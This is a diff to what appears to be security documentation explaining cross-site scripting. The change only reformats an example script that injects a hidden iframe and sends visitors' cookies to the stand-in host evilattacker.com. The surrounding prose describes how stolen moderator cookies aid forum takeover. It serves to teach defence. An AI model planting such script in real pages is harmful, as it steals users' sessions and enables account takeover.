@@ -5,7 +5,8 @@ Let's imagine that an attacker has stumbled across a custom built forum which al
 
 .. code-block:: html
 
-    <script>document.write('<iframe src="http://evilattacker.com?cookie=' + document.cookie.escape() + '" height=0 width=0 />');</script>
+    <script>document.write('<iframe src="http://evilattacker.com?cookie='
+        + document.cookie.escape() + '" height=0 width=0 />');</script>
 
 By some miracle, the forum software includes this signature as-is in all those spammed topics for all the forum users to load into their browsers. The results should be obvious from the Javascript code. The attacker is injecting an iframe into the page which will appear as a teeny tiny dot (zero sized) at the very bottom of the page attracting no notice from anyone. The browser will send the request for the iframe content which passes each user's cookie value as a GET parameter to the attacker's URI where they can be collated and used in further attacks. While typical users aren't that much of a target for an attacker, a well designed trolling topic will no doubt attract a moderator or administrator whose cookie may be very valuable in gaining access to the forums moderation functions.
 
